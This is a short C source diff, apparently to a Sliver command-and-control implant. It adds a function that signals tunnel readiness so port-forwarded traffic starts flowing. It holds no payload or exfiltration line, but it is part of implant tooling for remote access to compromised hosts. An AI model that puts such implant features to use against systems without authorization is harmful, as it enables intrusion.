@@ -93,6 +93,22 @@ static int forward_send_data(portfwd_t *f, const void *data, size_t len, int clo
   return rc;
 }
 
+/* Tells the peer this tunnel generation is live. Sliver only relays client bytes
+ * to an implant tunnel after the implant has produced a frame on it (the client
+ * waits for Bound()), so a silent tunnel receives nothing at all. */
+static void forward_ready(portfwd_t *f) {
+  sliver_buf_t msg;
+  if (g_send == NULL) {
+    return;
+  }
+  sliver_buf_init(&msg);
+  if (sliver_tunnel_data_encode(&msg, NULL, 0, 0, f->sequence, f->id,
+                                f->read_sequence + 1) == 0) {
+    (void)g_send(SLIVER_MSG_TUNNEL_DATA, msg.data, msg.len);
+  }
+  sliver_buf_free(&msg);
+}
+
 static void forward_ack(portfwd_t *f) {
   sliver_buf_t msg;
   if (g_send == NULL) {
@@ -224,6 +240,7 @@ int sliver_rpc_handle_portfwd(const sliver_envelope_t *req, sliver_buf_t *out) {
     if (f->lock == NULL) {
       f->lock = sliver_mutex_create();
     }
+    forward_ready(f);
     if (f->pending_len != 0) {
       LOG_DEBUG("portfwd: flushing %u buffered bytes", (unsigned)f->pending_len);
       (void)sliver_socket_send(f->sock, f->pending, f->pending_len);
@@ -310,6 +327,7 @@ int sliver_portfwd_tunnel_close(uint64_t tunnel_id) {
   forward_release(f);
   return 1;
 }
+
 
 
 
